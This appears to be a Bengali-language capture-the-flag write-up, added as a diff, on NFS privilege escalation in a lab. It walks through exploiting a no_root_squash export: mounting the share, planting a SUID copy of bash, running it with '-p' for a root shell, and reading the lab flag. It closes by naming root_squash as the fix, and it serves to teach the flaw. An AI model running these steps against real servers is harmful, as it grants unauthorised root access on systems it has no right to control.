@@ -1,0 +1,216 @@
+===============================
+NFS Privilege Escalation (বাংলায় ব্যাখ্যা)
+===============================
+
+Target Machine IP:
+-------------------
+10.49.170.64
+
+লক্ষ্য:
+-------
+NFS এর ভুল configuration ব্যবহার করে root access নেওয়া।
+
+========================================
+STEP 1: NFS EXPORT CHECK করা
+========================================
+
+Target Machine এ:
+
+Command:
+---------
+cat /etc/exports
+
+Output:
+--------
+/opt/nfs *(rw,sync,no_root_squash,no_subtree_check)
+
+ব্যাখ্যা:
+---------
+এই লাইনের মানে হলো "/opt/nfs" নামের folder টি NFS এর মাধ্যমে share করা হয়েছে।
+
+এখানে গুরুত্বপূর্ণ option গুলো:
+
+1. rw
+   ----
+   Read & Write permission দেওয়া হয়েছে।
+   অর্থাৎ share এর ভিতরে file তৈরি/modify করা যাবে।
+
+2. no_root_squash
+   ----------------
+   সবচেয়ে গুরুত্বপূর্ণ vulnerability।
+
+   Normally:
+   ----------
+   NFS server remote root user কে "nobody" user এ convert করে দেয়।
+
+   কিন্তু এখানে:
+   --------------
+   no_root_squash থাকার কারণে
+   attacker machine এর root user,
+   target machine এও root হিসেবেই কাজ করবে।
+
+3. no_subtree_check
+   ------------------
+   subtree verification বন্ধ।
+
+----------------------------------------
+
+এখন check করা হলো কোন share export হয়েছে:
+
+Command:
+---------
+showmount -e 10.49.170.64
+
+Output:
+--------
+Export list for 10.49.170.64:
+/opt/nfs *
+
+ব্যাখ্যা:
+---------
+"*" মানে যেকোনো machine এই NFS share mount করতে পারবে।
+
+========================================
+STEP 2: AttackBox এ NFS SHARE MOUNT করা
+========================================
+
+AttackBox এ (root user হিসেবে):
+
+Mount directory তৈরি:
+----------------------
+mkdir /tmp/nfs
+
+NFS share mount:
+-----------------
+sudo mount -o rw 10.49.170.64:/opt/nfs /tmp/nfs
+
+ব্যাখ্যা:
+---------
+এখন target machine এর "/opt/nfs"
+আমাদের AttackBox এর "/tmp/nfs" folder এ access করা যাচ্ছে।
+
+কারণ no_root_squash enabled,
+তাই AttackBox এর root permission preserve হয়েছে।
+
+========================================
+STEP 3: SUID ROOT SHELL তৈরি করা
+========================================
+
+bash copy করা:
+---------------
+cp /bin/bash /tmp/nfs/bash
+
+ব্যাখ্যা:
+---------
+Target এর shared folder এর ভিতরে
+একটি bash binary copy করা হলো।
+
+----------------------------------------
+
+SUID bit set করা:
+------------------
+sudo chmod +s /tmp/nfs/bash
+
+Verify:
+--------
+ls -l /tmp/nfs/bash
+
+Output:
+--------
+-rwsr-sr-x
+
+ব্যাখ্যা:
+---------
+"s" মানে SUID enabled।
+
+SUID কি?
+---------
+যখন কোনো SUID file execute করা হয়,
+তখন file owner এর permission নিয়ে run হয়।
+
+এখানে:
+--------
+Owner = root
+
+তাই bash execute করলে
+root privilege পাওয়া যাবে।
+
+========================================
+STEP 4: TARGET MACHINE এ ROOT SHELL নেওয়া
+========================================
+
+Target Machine এ:
+
+NFS folder এ যাওয়া:
+--------------------
+cd /opt/nfs
+
+Files check:
+--------------
+ls
+
+Output:
+--------
+bash  todo.txt
+
+----------------------------------------
+
+SUID bash execute:
+-------------------
+./bash -p
+
+ব্যাখ্যা:
+---------
+"-p" privileged mode preserve করে।
+
+ফলে bash root permission retain করে।
+
+========================================
+STEP 5: ROOT ACCESS VERIFY
+========================================
+
+Command:
+---------
+whoami
+
+Output:
+--------
+root
+
+Flag read:
+-----------
+cat /root/flag.txt
+
+Output:
+--------
+THM{exports-r00T-nfs}
+
+========================================
+পুরো Attack Flow
+========================================
+
+Target এ vulnerable NFS share ছিল
+            ↓
+AttackBox থেকে share mount করা হলো
+            ↓
+Root user দিয়ে SUID bash তৈরি করা হলো
+            ↓
+SUID binary target machine এ চলে গেল
+            ↓
+Binary execute করা হলো
+            ↓
+ROOT SHELL পাওয়া গেল
+
+========================================
+মূল Vulnerability
+========================================
+
+no_root_squash
+
+কারণ:
+-------
+Remote root user কে restrict করা হয়নি।
+
+Secure configuration হওয়া উচিত:
+--------------------------------
+root_squash
